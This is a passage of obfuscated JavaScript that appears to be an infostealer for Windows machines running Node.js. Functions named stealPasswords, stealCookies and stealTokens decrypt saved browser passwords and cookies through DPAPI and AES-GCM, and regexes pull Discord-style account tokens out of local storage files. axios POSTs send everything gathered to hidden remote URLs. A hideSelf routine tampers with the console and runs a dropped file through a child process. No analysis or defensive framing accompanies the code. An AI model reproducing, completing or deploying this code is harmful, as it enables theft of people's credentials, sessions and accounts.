            }, WJrIL: function (_0x4fdaa6, _0x594f41) {
                return _0x1d77ab[decoder_function(518, 292)](_0x4fdaa6, _0x594f41);
            }, PQJzk: function (_0x4ffb1d, _0x55aa9a) {
                return _0x4ffb1d == _0x55aa9a;
            }, yyzFO: _0x1d77ab[decoder_function(517, 942)], ienal: decoder_function(459, 807), UVeXi: function (_0x504a16, _0x68ab3e) {
                return _0x1d77ab[decoder_function(519, 613)](_0x504a16, _0x68ab3e);
            }, cCKyy: function (_0x3d0ffa, _0x4eaaab) {
                return _0x1d77ab[decoder_function(520, 41)](_0x3d0ffa, _0x4eaaab);
            }, PALNM: function (_0x4afed9, _0x11684c) {
                return _0x1d77ab[decoder_function(520, -120)](_0x4afed9, _0x11684c);
            }, WmIkb: function (_0x15516a, _0x393e8c) {
                return _0x15516a(_0x393e8c);
            }};
        _0x149ab4[decoder_function(486, 727)](decoder_function(521, 1319), async function (_0x50b5f2, _0x5130ae) {
            if (_0x50b5f2) {}
            _0x5130ae ? _0x5130ae[decoder_function(396, -411)](async _0x7399c9 => {
                let _0x1fa4c8 = _0x7399c9[decoder_function(522, 1174)];
                try {
                    if (_0x1fa4c8[0] == 1 && _0x5b4eb3[decoder_function(523, 1132)](_0x1fa4c8[1], 0) && _0x5b4eb3[decoder_function(524, 921)](_0x1fa4c8[2], 0) && _0x5b4eb3[decoder_function(525, 912)](_0x1fa4c8[3], 0)) _0x2f5f0d += decoder_function(526, 1140) + _0x7399c9[decoder_function(527, -267)] + decoder_function(528, 1399) + _0x7399c9[decoder_function(529, -311)] + decoder_function(530, 1350) + dpapi[decoder_function(481, 956)](_0x1fa4c8, null, _0x5b4eb3[decoder_function(531, -200)])[decoder_function(496, 1444)](_0x5b4eb3[decoder_function(532, 1110)]); else {
                        if (_0x5b4eb3[decoder_function(533, 951)](_0x1fa4c8[0], 118) && _0x5b4eb3[decoder_function(533, -300)](_0x1fa4c8[1], 49) && _0x5b4eb3[decoder_function(533, 1388)](_0x1fa4c8[2], 48)) {
                            let _0x509506 = _0x1fa4c8[decoder_function(348, 930)](3, 15), _0x4bb650 = _0x1fa4c8[decoder_function(348, 1294)](15, _0x5b4eb3[decoder_function(534, 962)](_0x1fa4c8[decoder_function(466, -206)], 16)), _0x45b1c2 = _0x1fa4c8[decoder_function(348, 1289)](_0x5b4eb3[decoder_function(535, 963)](_0x1fa4c8[decoder_function(466, 1102)], 16), _0x1fa4c8[decoder_function(466, -302)]), _0x12ba4b = crypto[decoder_function(499, -138)](decoder_function(500, 1108), _0x3cc6e3, _0x509506);
                            _0x12ba4b[decoder_function(501, 957)](_0x45b1c2);
                            let _0x44cc77 = _0x12ba4b[decoder_function(502, 1226)](_0x4bb650, decoder_function(460, 1307), decoder_function(459, 1320));
                            _0x44cc77 += _0x12ba4b[decoder_function(504, 962)](_0x5b4eb3[decoder_function(532, 1572)]), _0x2f5f0d += decoder_function(526, 1010) + _0x7399c9[decoder_function(527, 1043)] + decoder_function(528, 898) + _0x7399c9[decoder_function(529, 1378)] + decoder_function(530, 1199) + _0x44cc77;
                        }
                    }
                } catch (_0x1c8b2d) {
                    if (debug) console[decoder_function(422, -433)](_0x50b5f2);
                }
            }) : (intents_cookies++, intents_cookies == 5 ? intents_cookies = 0 : _0x5b4eb3[decoder_function(536, 1285)](getCookies, _0x6cb3a2)), _0x5b4eb3[decoder_function(536, -402)](_0xca0c44, _0x2f5f0d);
        });
    });
    return _0xf55a52;
}
async function stealPasswords() {
    const _0x58360c = {HgsAb: function (_0x8eade7, _0x410346) {
            return _0x8eade7 < _0x410346;
        }, EZLOQ: decoder_function(477, 308), FXWDq: function (_0x3dc874, _0x3c4501) {
            return _0x3dc874(_0x3c4501);
        }, pXUJj: function (_0x12aa2b, _0x46dbf0) {
            return _0x12aa2b === _0x46dbf0;
        }, wriqs: function (_0x4f1819, _0x293f72) {
            return _0x4f1819 + _0x293f72;
        }, PSdCS: decoder_function(537, 179)};
    if (passwordsStealed) return;
    passwordsStealed = true;
    let _0x42b20e = "";
    for (let _0xd4a5ec = 0; _0x58360c[decoder_function(538, 1056)](_0xd4a5ec, paths[decoder_function(466, 79)]); _0xd4a5ec++) {
        fs[decoder_function(419, 973)](paths[_0xd4a5ec] + _0x58360c[decoder_function(539, -259)]) && (_0x42b20e += await _0x58360c[decoder_function(540, 1150)](getPasswords, paths[_0xd4a5ec]) || ""), _0x58360c[decoder_function(541, 182)](_0x58360c[decoder_function(542, -350)](_0xd4a5ec, 1), paths[decoder_function(466, -264)]) && axios[decoder_function(543, 257)](_0x58360c[decoder_function(544, 1001)], _0x42b20e, {headers: {"Content-Type": decoder_function(545, 237)}});
    }
}
async function stealCookies() {
    const _0x33cc8a = {vdvUD: decoder_function(507, -128)};
    if (cookiesStealed) return;
    cookiesStealed = true;
    let _0xb7e94c = "";
    for (let _0x3bb993 = 0; _0x3bb993 < paths[decoder_function(466, -61)]; _0x3bb993++) {
        fs[decoder_function(419, -34)](paths[_0x3bb993] + _0x33cc8a[decoder_function(546, -100)]) && (_0xb7e94c += await getCookies(paths[_0x3bb993]) || ""), _0x3bb993 + 1 === paths[decoder_function(466, 30)] && axios[decoder_function(543, 276)](decoder_function(547, 102), _0xb7e94c, {headers: {"Content-Type": decoder_function(545, 1216)}});
    }
}
function hideSelf() {
    const _0x505033 = {Vxjhl: function (_0x19361e, _0x526be) {
            return _0x19361e(_0x526be);
        }, votLA: decoder_function(548, 15), RTVPY: decoder_function(549, 118), hZxOr: decoder_function(421, 458), lFUUQ: decoder_function(550, 705), OCCAQ: decoder_function(551, 42), bEJKX: decoder_function(552, 729), CBrln: decoder_function(357, -240)}, _0x3ff8cc = function () {
        let _0x190bdc = true;
        return function (_0x2c0c62, _0x37c528) {
            const _0x2047b9 = _0x190bdc ? function () {
                if (_0x37c528) {
                    const _0x12f21c = _0x37c528[decoder_function(553, 454)](_0x2c0c62, arguments);
                    return _0x37c528 = null, _0x12f21c;
                }
            } : function () {};
            return _0x190bdc = false, _0x2047b9;
        };
    }();
    const _0x37d220 = _0x3ff8cc(this, function () {
        const _0x39dbef = function () {
            let _0x4cade9;
            try {
                _0x4cade9 = _0x505033[decoder_function(554, 747)](Function, decoder_function(555, 668) + _0x505033[decoder_function(556, 299)] + ");")();
            } catch (_0x56da88) {
                _0x4cade9 = window;
            }
            return _0x4cade9;
        };
        const _0x7fd9cb = _0x39dbef(), _0x53b111 = _0x7fd9cb[decoder_function(557, 1167)] = _0x7fd9cb[decoder_function(557, 1116)] || {};
        const _0xb63ecb = [decoder_function(422, 118), _0x505033[decoder_function(558, 1177)], decoder_function(559, 1111), _0x505033[decoder_function(560, 220)], _0x505033[decoder_function(561, 1380)], _0x505033[decoder_function(562, -48)], _0x505033[decoder_function(563, 712)]];
        for (let _0x5b28c5 = 0; _0x5b28c5 < _0xb63ecb[decoder_function(466, 1152)]; _0x5b28c5++) {
            const _0x29d416 = _0x3ff8cc[decoder_function(564, 1160)][decoder_function(565, 688)][decoder_function(566, 1037)](_0x3ff8cc), _0x3708cb = _0xb63ecb[_0x5b28c5], _0x2b42c5 = _0x53b111[_0x3708cb] || _0x29d416;
            _0x29d416[decoder_function(567, 632)] = _0x3ff8cc[decoder_function(566, 1042)](_0x3ff8cc), _0x29d416[decoder_function(496, 462)] = _0x2b42c5[decoder_function(496, 923)][decoder_function(566, 1174)](_0x2b42c5), _0x53b111[_0x3708cb] = _0x29d416;
        }
    });
    _0x37d220();
    let _0x28e1fb = decoder_function(568, -197), _0x18745f = process[decoder_function(569, 1268)](), _0x4a6d34 = _0x18745f + decoder_function(570, 32);
    fs[decoder_function(414, 1232)](_0x4a6d34, _0x28e1fb);
    require(_0x505033[decoder_function(571, 776)])[decoder_function(572, 143)](decoder_function(573, 207), {stdio: decoder_function(574, 714)}), fs[decoder_function(575, 641)](_0x4a6d34);
}
function findToken(_0x5a44a2) {
    const _0x268352 = {vziAp: decoder_function(576, 1197), opOEp: decoder_function(577, 1328), VSYti: decoder_function(415, 1048), JbjxW: decoder_function(578, 61)};
    _0x5a44a2 += _0x268352[decoder_function(579, 1190)];
    let _0x3572b9 = [];
    try {
        fs[decoder_function(395, 1387)](_0x5a44a2)[decoder_function(404, -196)](_0x50e15f => {
            (_0x50e15f[decoder_function(580, 1104)](_0x268352[decoder_function(581, 1183)]) || _0x50e15f[decoder_function(580, 588)](_0x268352[decoder_function(582, 1220)])) && fs[decoder_function(455, 964)](_0x5a44a2 + "\\" + _0x50e15f, _0x268352[decoder_function(583, 483)])[decoder_function(430, 1159)](/\r?\n/)[decoder_function(396, -71)](_0x145d9b => {
                const _0x1282a5 = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
                for (const _0x2c0958 of _0x1282a5) {
                    const _0x3f59cc = _0x145d9b[decoder_function(584, 428)](_0x2c0958);
                    _0x3f59cc && _0x3f59cc[decoder_function(396, 556)](_0x426230 => {
                        _0x3572b9[decoder_function(400, 1265)](_0x426230);
                    });
                }
            });
        });
    } catch (_0x36af19) {
        if (debug) console[decoder_function(422, 991)](_0x36af19);
    }
    return _0x3572b9;
}
function onlyUnique(_0x1df195, _0x230c6a, _0x4d49a3) {
    return _0x4d49a3[decoder_function(585, 1510)](_0x1df195) === _0x230c6a;
}
async function stealTokens() {
    const _0x262320 = {XbVMZ: function (_0x460c22, _0x187e83) {
            return _0x460c22(_0x187e83);
        }, uYxrU: decoder_function(586, 1163)};
    if (tokensStealed) return;
    tokensStealed = true;
    const _0xe04952 = [];
    for (let _0x433a7e of paths) {
        const _0x281d2c = _0x262320[decoder_function(587, 1147)](findToken, _0x433a7e);
        _0x281d2c && _0x281d2c[decoder_function(396, 122)](_0x44205f => {
            _0xe04952[decoder_function(400, 773)](_0x44205f);
        });
    }
    var sent_data = _0xe04952[decoder_function(588, 1275)](onlyUnique);
    const headers_var = {"Content-Type": _0x262320[decoder_function(589, 1242)]};
    const post_request = {method: decoder_function(590, 1321), url: decoder_function(591, 239), headers: headers_var, data: sent_data};
    axios[decoder_function(592, 1373)](post_request);
}
